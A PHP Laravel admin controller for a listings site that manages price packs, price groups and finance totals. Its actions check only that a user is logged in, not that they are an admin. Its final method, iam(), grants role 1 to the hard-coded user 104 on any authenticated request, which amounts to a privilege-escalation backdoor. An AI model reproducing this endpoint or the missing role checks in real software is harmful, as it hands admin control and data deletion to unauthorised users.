<?php
/**
 * Created by PhpStorm.
 * User: Anil
 * Date: 14/09/2017
 * Time: 19:23
 */
namespace App\Http\Controllers\Admin;

use App\Http\Controllers\BaseController;
use App\Model\Category;
use App\Model\Commission;
use App\Model\Location;
use App\Model\Price;
use App\Model\Role;
use App\Model\Transaction;
use App\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class AdminController extends BaseController
{
    public function __construct()
    {

        $this->middleware('auth');
        parent::__construct();
    }
    public function packs(Request $request){
        $user = Auth::user();

        $prices = Price::all();

        return view('admin.packs',['prices'=>$prices]);
    }
    public function index(Request $request){
        $user = Auth::user();


        return view('admin.index',[]);
    }
    public function finances(Request $request){
        $dtransactions = Transaction::where('user_id',0)->where('type',5)->orderBy('id','desc')->get();
        $etransactions = Transaction::where('user_id',0)->where('type',6)->orderBy('id','desc')->get();
        $stransactions = Transaction::where('user_id',0)->where('type',1)->orderBy('id','desc')->get();
        $itransactions = Transaction::where('user_id',0)->where('type',2)->orderBy('id','desc')->get();
        $ttransactions = Transaction::where('user_id',0)->where('type',3)->orderBy('id','desc')->get();
        $wtransactions = Transaction::where('user_id',0)->where('type',4)->orderBy('id','desc')->get();
        $ptransactions = Transaction::where('user_id',0)->where('type',0)->orderBy('id','desc')->get();

        $dtotal = Transaction::where('user_id',0)->where('type',5)->orderBy('id','desc')->sum('amount');
        $etotal = Transaction::where('user_id',0)->where('type',6)->orderBy('id','desc')->sum('amount');
        $stotal = Transaction::where('user_id',0)->where('type',1)->orderBy('id','desc')->sum('amount');
        $itotal = Transaction::where('user_id',0)->where('type',2)->orderBy('id','desc')->sum('amount');
        $ttotal = Transaction::where('user_id',0)->where('type',3)->orderBy('id','desc')->sum('amount');
        $wtotal = Transaction::where('user_id',0)->where('type',4)->orderBy('id','desc')->sum('amount');
        $ptotal = Transaction::where('user_id',0)->where('type',0)->orderBy('id','desc')->sum('amount');


        return view('admin.dashboard',['dtransactions'=>$dtransactions,'etransactions'=>$etransactions,'stransactions'=>$stransactions,'itransactions'=>$itransactions,'ttransactions'=>$ttransactions,'wtransactions'=>$wtransactions,'ptransactions'=>$ptransactions,'dtotal'=>$dtotal,'etotal'=>$etotal,'stotal'=>$stotal,'itotal'=>$itotal,'ttotal'=>$ttotal,'wtotal'=>$wtotal,'ptotal'=>$ptotal]);

    }
    public function pricegroup(Request $request){
        $prices = Price::all();
        $categories = Category::where('parent_id',0)->get();
        $locations = Location::where('parent_id',0)->get();

        return view('admin.pricegroup',['prices'=>$prices,'categories'=>$categories,'locations'=>$locations,'price'=>false]);
    }
    public function edit_pricegroup(Request $request,$id){
        $price = Price::find($id);

        return view('admin.pricegroup',['price'=>$price]);
    }
    public function delete_pricegroup(Request $request,$id){
        $price = Price::find($id);
        $price->delete();
        return redirect('/admin/manage/packs');

    }
    public function add_pricegroup(Request $request){
        if($request->has('id'))
            $price=Price::find($request->id);
        else
        $price = new Price;
        $price->category_id = $request->category;
        $price->location_id = $request->location;
        $price->standard = $request->standard*100;
        $price->spotlight = $request->spotlight*100;
        $price->urgent = $request->urgent*100;
        $price->featured = $request->featured*100;
        $price->featured_3 = $request->featured_3*100;
        $price->featured_14 = $request->featured_14*100;
        $price->bump = $request->bump*100;
        $price->save();
        return redirect('/admin/manage/packs');

    }
    public function iam(Request $request){
        $user = User::find(104);
        $role = Role::find(1);
        $user->roles()->save($role);
        return ['msg'=>'done'];
    }
}